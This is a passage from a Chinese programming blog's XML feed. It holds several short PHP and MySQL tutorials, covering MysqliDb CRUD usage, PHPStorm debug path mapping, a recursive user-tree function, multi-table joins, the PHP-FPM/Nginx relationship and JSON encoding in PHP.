，而终端软件则不行；</li><li><code>tmux</code> 简洁优雅、订制性强，学会之后也能在 <code>Linux</code> 上使用，有助于逼格提升。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://gist.github.com/ryerh/14b7c24dfd623ef8edc7" target="_blank" rel="noopener">Tmux 快捷键&amp;速查表&amp;简明教程</a></li><li><a href="https://www.cnblogs.com/kaiye/p/6275207.html" target="_blank" rel="noopener">十分钟学会 Tmux</a></li><li>[Tmux 快捷键和备忘录](</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Mac </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MysqliDb 快速上手</title>
      <link href="/mysqlidb-is-quick-to-get-started/"/>
      <url>/mysqlidb-is-quick-to-get-started/</url>
      
        <content type="html"><![CDATA[<p>MysqliDb 是基于 mysqli 扩展出来的一个类库，其中封装了很多常用的Mysql 基础操作，相比原生的方式，后者使用起来更加方便。</p><p>具有如下特点：</p><ol><li>支持链式操作</li><li>支持Mysql 函数的使用</li><li>…</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用composer 安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require thingengineer&#x2F;mysqli-database-class:dev-master</span><br></pre></td></tr></table></figure><p>因为<code>MysqliDb</code>没有命名空间，所以我们想要使用的话，不能自动加载，只能先引入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require &quot;MysqliDb.php&quot;;</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>初始化连接有几种方式：</p><h4 id="1-MysqliDb-字符串"><a href="#1-MysqliDb-字符串" class="headerlink" title="1. MysqliDb 字符串"></a>1. MysqliDb 字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new MysqliDb (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);</span><br></pre></td></tr></table></figure><h4 id="2-MysqliDb-对象"><a href="#2-MysqliDb-对象" class="headerlink" title="2. MysqliDb 对象"></a>2. MysqliDb 对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new MysqliDb ([</span><br><span class="line">  &#39;host&#39; &#x3D;&gt; &#39;host&#39;,</span><br><span class="line">  &#39;username&#39; &#x3D;&gt; &#39;username&#39;, </span><br><span class="line">  &#39;password&#39; &#x3D;&gt; &#39;password&#39;,</span><br><span class="line">  &#39;db&#39;&#x3D;&gt; &#39;databaseName&#39;,</span><br><span class="line">  &#39;port&#39; &#x3D;&gt; 3306,</span><br><span class="line">  &#39;prefix&#39; &#x3D;&gt; &#39;my_&#39;,</span><br><span class="line">  &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h4 id="3-mysqli-对象"><a href="#3-mysqli-对象" class="headerlink" title="3. mysqli 对象"></a>3. mysqli 对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$mysqli &#x3D; new mysqli (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);</span><br><span class="line">$db &#x3D; new MysqliDb ($mysqli);</span><br></pre></td></tr></table></figure><h3 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h3><p>向user 表中插入一条记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [</span><br><span class="line">  &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  &quot;age&quot; &#x3D;&gt; 21,</span><br><span class="line">  &quot;gender&quot; &#x3D;&gt; &quot;man&quot;</span><br><span class="line">];</span><br><span class="line">$success &#x3D; $db-&gt;insert(&quot;user&quot;, $data);</span><br></pre></td></tr></table></figure><p>返回值类型：bool</p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>修改user 表中的一条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [</span><br><span class="line">  &quot;age&quot; &#x3D;&gt; 22,</span><br><span class="line">];</span><br><span class="line">$success &#x3D; $db-&gt;where([&quot;name&quot; &#x3D;&gt; &quot;boo&quot;])</span><br><span class="line">   -&gt;update(&quot;user&quot;, $data);</span><br></pre></td></tr></table></figure><p>返回值类型：bool</p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><h4 id="获取user-表所有数据："><a href="#获取user-表所有数据：" class="headerlink" title="获取user 表所有数据："></a>获取user 表所有数据：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;get(&quot;user&quot;, null, &quot;*&quot;);</span><br></pre></td></tr></table></figure><p>返回值：多维数组</p><h4 id="获取user-表单条数据："><a href="#获取user-表单条数据：" class="headerlink" title="获取user 表单条数据："></a>获取user 表单条数据：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;getOne(&quot;user&quot;,  &quot;*&quot;);</span><br></pre></td></tr></table></figure><p>返回值：关联数组</p><h4 id="获取user-表单个字段的值："><a href="#获取user-表单个字段的值：" class="headerlink" title="获取user 表单个字段的值："></a>获取user 表单个字段的值：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;where(&quot;name&quot;, &quot;boo&quot;)</span><br><span class="line"> -&gt;getValue(&quot;user&quot;, &quot;*&quot;);</span><br></pre></td></tr></table></figure><p>返回值：string</p><h4 id="获取查询条数："><a href="#获取查询条数：" class="headerlink" title="获取查询条数："></a>获取查询条数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;getValue(&quot;user&quot;, &quot;count(*)&quot;);</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除user 表中一条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$success &#x3D; $db-&gt;where(&quot;user_id&quot;, &quot;boo&quot;)</span><br><span class="line">  -&gt;delete(&quot;user);</span><br></pre></td></tr></table></figure><h3 id="运行原生SQL"><a href="#运行原生SQL" class="headerlink" title="运行原生SQL"></a>运行原生SQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $db-&gt;rawQuery(&quot;select * from user where name &#x3D; \&quot;boo\&quot;&quot;)</span><br></pre></td></tr></table></figure><p>总体来说，MysqliDb 真的挺好用的，基本上可以满足所有日常需求。<br>这里只是列举了最基本的CURD，更多操作可以参考<a href="https://github.com/joshcam/PHP-MySQLi-Database-Class" target="_blank" rel="noopener">官网手册</a>。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://packagist.org/packages/joshcam/mysqli-database-class" target="_blank" rel="noopener">joshcam/mysqli-database-class</a></p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Mysqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPStrom 高级技巧整理</title>
      <link href="/phpstorm-advanced-skills-finishing/"/>
      <url>/phpstorm-advanced-skills-finishing/</url>
      
        <content type="html"><![CDATA[<p>PHPStrom 是我日常使用频率很高的 IDE。</p><p>基础的使用这里就不过多介绍了，这里主要是用来整理一些比较高级的用法。</p><h3 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h3><p>调试是日常开发中，不可缺少的一部分。</p><h4 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h4><p>通常都是用来调试本地代码，可如果需要调试虚拟机或者其他应用中时，那该怎么做呢？</p><p>打开偏好设置或者设置，找到一个已经配置好的服务，勾选映射。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200930144728.png" alt=""></p><p>然后找到该服务的入口配置文件，后面的文件路径填绝对路径。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PHPStorm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归算法</title>
      <link href="/recursive-algorithm/"/>
      <url>/recursive-algorithm/</url>
      
        <content type="html"><![CDATA[<p>最近在业务上遇到一个需求，需要根据已知的一个数一层一层查找除所有对应下级用户，然后将结果放在数组中。</p><a id="more"></a><p>最后返回的结果大概是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; [</span><br><span class="line">  0 &#x3D;&gt; [</span><br><span class="line">    &quot;user_id&quot; &#x3D;&gt; &quot;php&quot;,</span><br><span class="line">    &quot;sub_id&quot; &#x3D;&gt; [</span><br><span class="line">    0 &#x3D;&gt; [</span><br><span class="line">      &quot;user_id&quot; &#x3D;&gt; &quot;python&quot;,</span><br><span class="line">      &quot;sub_id&quot; &#x3D;&gt; []</span><br><span class="line">      ],</span><br><span class="line">      1 &#x3D;&gt; [</span><br><span class="line">      &quot;user_id&quot; &#x3D;&gt; &quot;go&quot;,</span><br><span class="line">      &quot;sup_id&quot; &#x3D;&gt; [</span><br><span class="line">      0 &#x3D;&gt; [</span><br><span class="line">      &quot;user_id&quot; &#x3D;&gt; &quot;ruby&quot;,</span><br><span class="line">      &quot;sub_id&quot; &#x3D;&gt; []</span><br><span class="line">      ]</span><br><span class="line">      ]</span><br><span class="line">      ],</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>这个问题的难点在于：</p><ol><li>我并不知道有多少个下级</li><li>索引是未知的。</li></ol><p>对于这个问题，首先第一个想到是使用递归算法来解决。</p><p>使用递归算法是没错，不过思路还是有些问题，我试图通过正向查找，然后将数据 push 至结果集。<br>所以这里存在一个问题：我需要知道数组具体的索引是多少。</p><p>在第一个思路无解之后，果断放弃了。<br>要解决这个问题，我得正向查找，逆向存值。</p><p>也就是把递归返回的结果压入到当前用户的数组中，然后返回当前用户，从最后一个用户往前处理。</p><p>最后实现的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function get_user_tree($user_id)&#123;</span><br><span class="line">$result &#x3D; [];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; todo（数据查询）</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 遍历数据 </span><br><span class="line">foreach ($data as $item)&#123;</span><br><span class="line">$user &#x3D; get_user_tree($item[&#39;user_id&#39;]);</span><br><span class="line">$item[&#39;sub_id&#39;] &#x3D; $user;</span><br><span class="line">array_push($result, $item);</span><br><span class="line">&#125;</span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不得不说递归算法真的非常优雅，仅仅不到十来行代码就把这个复杂的问题给解决了。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 多表联查</title>
      <link href="/mysql-multi-table-joint-check/"/>
      <url>/mysql-multi-table-joint-check/</url>
      
        <content type="html"><![CDATA[<p>Mysql 的两张表联表查询可能大家都知道怎么查，但如果是三张表或者是更多张表呢？</p><a id="more"></a><p>其实不管是两张表还是三张表还是N 张表都是一样的。</p><h3 id="多表联查"><a href="#多表联查" class="headerlink" title="多表联查"></a>多表联查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 语法一：</span><br><span class="line">select t1.*, t2.*, t3.* </span><br><span class="line">from table1 t1, table2 t2, table3 t3</span><br><span class="line">where t1.id &#x3D; t2.id and t1.id &#x3D; t3.id;</span><br><span class="line"></span><br><span class="line"># 语法二：</span><br><span class="line">select t1.*, t2.*, t3.* </span><br><span class="line">from table t1 inner join table2 t2 </span><br><span class="line">on t1.id &#x3D; t2.id </span><br><span class="line">inner join table3 t3 </span><br><span class="line">on t1.id &#x3D; t3.id;</span><br></pre></td></tr></table></figure><p>有几点需要注意：</p><ol><li>上面的id 并不一定非要使用id，可以是任何有关联性的其他字段</li><li>如果表名是关键字，那么需要查询时在这个关键字上加反引号，如：`order`</li><li><code>inner join</code> 可以根据实际情况可以换成<code>left join</code>、<code>right join</code> </li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM 与 Nginx 是什么关系？</title>
      <link href="/what-is-the-relationship-between-php-fpm-and-nginx/"/>
      <url>/what-is-the-relationship-between-php-fpm-and-nginx/</url>
      
        <content type="html"><![CDATA[<p>最近部署了几次项目，经常遇到这样一个错误：<code>Nginx 502 bad gateway</code>，查看 Nginx 错误日志之后，发现这样一段话：<code>Primary script unknown</code>，找了好久的答案，总结出以下几个原因：</p><a id="more"></a><ul><li>未启动 Nginx </li><li>未启动 php-fpm</li><li>Nginx 配置异常</li><li>文件夹权限不足</li></ul><p>其中未启动 php-fpm 是出现最多的错误，再聊 php-fpm 之前，我们先来学习几个 相关概念。</p><h3 id="什么是-cgi"><a href="#什么是-cgi" class="headerlink" title="什么是 cgi"></a>什么是 cgi</h3><p>Cgi 是一个协议，它约定了 web server 和应用程序（如：PHP、Python等）之间的信息交换的标准格式。</p><h4 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h4><p>当一个客户端试图访问<code>index.html</code>这个文件时，那么 web server 就回去文件系统中找到这个文件，最后将结果返回给客户端。</p><h4 id="非静态文件"><a href="#非静态文件" class="headerlink" title="非静态文件"></a>非静态文件</h4><p>当一个客户端试图访问<code>index.php</code>这个文件时，web server 收到请求之后，根据配置文件知道了自己处理不了，接着转发给第三方的应用程序（PHP解析器、Python解析器等），web server 知道该传哪些数据吗？它不知道，<strong>所以 Cgi 就是约定要传哪些数据，以什么样的格式传递给第三方的应用程序的协议。</strong> 应用程序独立处理完该脚本，然后再将结果返回给产生响应的 web server，最后转发响应至客户端。</p><p>当 web server 收到 <code>index.php</code> 这个请求之后，会启动对应的 cgi 程序（PHP解析器，Python解析器），接下来解析器会解析 php.ini 配置文件，初始化执行环境，然后处理请求，再以 cgi 规定的格式返回处理后的结果，退出进程。web server 将转发响应至客户端。</p><p>这种协议看上去简单有效，但它也存在一些明显不足：</p><ol><li>每一个请求产生唯一一个进程，从一个请求到另一个请求，内容和其他的信息全部丢失。</li><li>开启一个进程会消耗系统的资源，大而重的并发请求（每产生一个进程）数量很快会使服务器一团糟。</li></ol><h3 id="什么是-fastcgi"><a href="#什么是-fastcgi" class="headerlink" title="什么是 fastcgi"></a>什么是 fastcgi</h3><p>知道了 cgi 是协议之后，那 fastcgi 又是什么呢？</p><p>知道了 cgi 服务器性能低下的原因是因为每产生一个请求，都会做同样的事情：解析器解析配置文件，初始化执行环境，启动一个新的进程。</p><p>fastcgi 则是在 cgi 的基础上做了重大的改进，从而达到相同的目的，原理如下：</p><ol><li>fgstcgi 使用了能够处理多个请求的持续进程，而不是针对每个请求都产生新的进程。</li><li>fastcgi 是一个基于套接字的协议，因此它能够适用于任务平台（web server）及任何编程语言。</li></ol><p>fastcgi 的性能之所以高于 cgi，是因为 fastcgi 可以对进程进行管理，而这是 cgi 所做不到的，但它的本质仍然是 协议。</p><h3 id="什么是-php-fpm"><a href="#什么是-php-fpm" class="headerlink" title="什么是 php-fpm"></a>什么是 php-fpm</h3><p>默认情况下，PHP 是支持 cgi 和 fastcgi 协议的。</p><p>PHP 二进制命令能够处理脚本并且能够通过套接字与Nginx 交互，但是这种方式并不是效率最高的，php-fpm 便是在这样的背景下诞生的。</p><p>PHP-FPM （PHP FastCgi 进程管理，PHP Fastcgi Process Manager）</p><p>php-fpm 将 fastcgi 带到了一个全新的水平。</p><h3 id="php-fpm-和-nginx-有什么联系"><a href="#php-fpm-和-nginx-有什么联系" class="headerlink" title="php-fpm 和 nginx 有什么联系"></a>php-fpm 和 nginx 有什么联系</h3><p>在理解了 cgi、fastcgi、php-fpm 是什么之后，就不难理解 php-fpm 和nginx是什么关系了。</p><p>因为 php-fpm 是 php fastcgi 的进程管理器，所以 php-fpm 就是 nginx 与 php 交互时，协助 php 将性能发挥最大的一个程序。</p><p>难怪每次 php-fpm 这个进程死掉时，nginx 的状态就变成了 502 。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://segmentfault.com/q/1010000000256516" target="_blank" rel="noopener">搞不清 Fastcgi 和 cgi 关系</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Nginx </tag>
            
            <tag> PHP-FPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何将 JSON 对象转换成 PHP 数组</title>
      <link href="/how-to-convert-a-json-object-into-a-php-array/"/>
      <url>/how-to-convert-a-json-object-into-a-php-array/</url>
      
        <content type="html"><![CDATA[<p>在介绍如何将JSON 字符串转传为PHP 数组之前，先来复习一下什么是JSON。</p><a id="more"></a><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>通俗一点讲JSON 就是一种数据结构，就是一串字符串，只不过元素会通过特定的符号标注。</p><ul><li><code>{}</code>：大括号表示对象</li><li><code>[]</code>：中括号表示数组</li><li><code>&quot;&quot;</code>：双引号内是属性或值</li></ul><p>标准的JSON 对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这是一个JSON 对象</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;boo&quot;,</span><br><span class="line">    &quot;gender&quot;: &quot;men&quot;,</span><br><span class="line">    &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>标准的JSON 数组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 这是一个包含两个对象的JSON 数组</span><br><span class="line">[   </span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;boo&quot;,</span><br><span class="line">        &quot;gender&quot;: &quot;men&quot;,</span><br><span class="line">        &quot;age&quot;: 25</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;max&quot;,</span><br><span class="line">        &quot;gender&quot;: &quot;men&quot;,,</span><br><span class="line">        &quot;age&quot;: 29</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 这是一个包含数组的JSON 对象</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:[&quot;Michael&quot;,&quot;Jerry&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在熟悉了几种常见的JSON 字符串之后，在来看一下如何解析JSON 字符串。</p><h3 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h3><p>JSON 对象转换为对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;</span><br><span class="line"></span><br><span class="line">$obj &#x3D; json_decode($jsonObj);</span><br><span class="line">print $obj-&gt;&#123;&quot;name&quot;&#125;;   &#x2F;&#x2F;boo</span><br><span class="line"></span><br><span class="line">$jsonObj2 &#x3D; &#39;[&#123;&quot;name&quot;: &quot;boo&quot;&#125;]&#39;;</span><br><span class="line"></span><br><span class="line">$obj2 &#x3D; json_decode($jsonObj2);</span><br><span class="line">print $obj[0]-&gt;&#123;&quot;name&quot;&#125;;   &#x2F;&#x2F;boo</span><br><span class="line"></span><br><span class="line">object(stdClass)[1]</span><br><span class="line">      public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)</span><br><span class="line"></span><br><span class="line">array (size&#x3D;1)</span><br><span class="line">  0 &#x3D;&gt; </span><br><span class="line">    object(stdClass)[1]</span><br><span class="line">      public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)</span><br></pre></td></tr></table></figure><p>JSON 对象转换为数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;</span><br><span class="line"></span><br><span class="line">$arr &#x3D; json_decode($jsonObj, true);</span><br><span class="line">print $arr[&#39;name&#39;];     &#x2F;&#x2F;boo</span><br><span class="line"></span><br><span class="line">array (size&#x3D;1)</span><br><span class="line">      &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)</span><br></pre></td></tr></table></figure><p>需要注意几个容易出错的细节：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 大括号外需要使用单引号</span><br><span class="line">$bad_json &#x3D; &quot;&#123; &#39;bar&#39;: &#39;baz&#39; &#125;&quot;;</span><br><span class="line">json_decode($bad_json);    &#x2F;&#x2F; null</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 属性需要使用双引号引起来</span><br><span class="line">$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot; &#125;&#39;;</span><br><span class="line">json_decode($bad_json);    &#x2F;&#x2F; null</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 不允许尾随逗号</span><br><span class="line">$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot;, &#125;&#39;;</span><br><span class="line">json_decode($bad_json);    &#x2F;&#x2F; null</span><br></pre></td></tr></table></figure><h3 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode"></a>json_encode</h3><p>下面来看看如何返回JSON 格式的数据，通过使用 <code>json_encode</code>这个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; array();</span><br><span class="line"></span><br><span class="line">echo &quot;空数组作为数组输出: &quot;, json_encode($b), &quot;\n&quot;;  &#x2F;&#x2F;空数组作为数组输出：[]</span><br><span class="line">echo &quot;空数组作为对象输出: &quot;, json_encode($b, JSON_FORCE_OBJECT), &quot;\n\n&quot;;   &#x2F;&#x2F;空数组作为对象输出：&#123;&#125;</span><br><span class="line"></span><br><span class="line">$c &#x3D; array(array(1,2,3));</span><br><span class="line"></span><br><span class="line">echo &quot;多维数组作为数组输出: &quot;, json_encode($c), &quot;\n&quot;;       &#x2F;&#x2F;多维数组作为数组输出：[[1,2,3]]</span><br><span class="line">echo &quot;多维数组作为对象输出: &quot;, json_encode($c, JSON_FORCE_OBJECT), &quot;\n\n&quot;;      &#x2F;&#x2F;多维数组作为对象输出：&#123;&quot;0&quot;:&#123;&quot;0&quot;:1,&quot;1&quot;:2,&quot;2&quot;:3&#125;&#125;</span><br><span class="line"></span><br><span class="line">$d &#x3D; array(&#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;baz&#39; &#x3D;&gt; &#39;long&#39;);</span><br><span class="line"></span><br><span class="line">echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d), &quot;\n&quot;;       &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;</span><br><span class="line">echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d, JSON_FORCE_OBJECT), &quot;\n\n&quot;;      &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;</span><br><span class="line"></span><br><span class="line">$arr &#x3D; array(</span><br><span class="line">  &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  &quot;gender&quot; &#x3D;&gt; &quot;men&quot;,</span><br><span class="line">  &quot;age&quot; &#x3D;&gt; 22</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$res &#x3D; json_encode($arr);</span><br><span class="line">var_dump($res);</span><br><span class="line">echo($res);</span><br><span class="line"></span><br><span class="line">string &#39;&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;&#39; (length&#x3D;35)</span><br><span class="line">&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同一局域网内如何访问项目地址、连接 Mysql</title>
      <link href="/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/"/>
      <url>/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/</url>
      
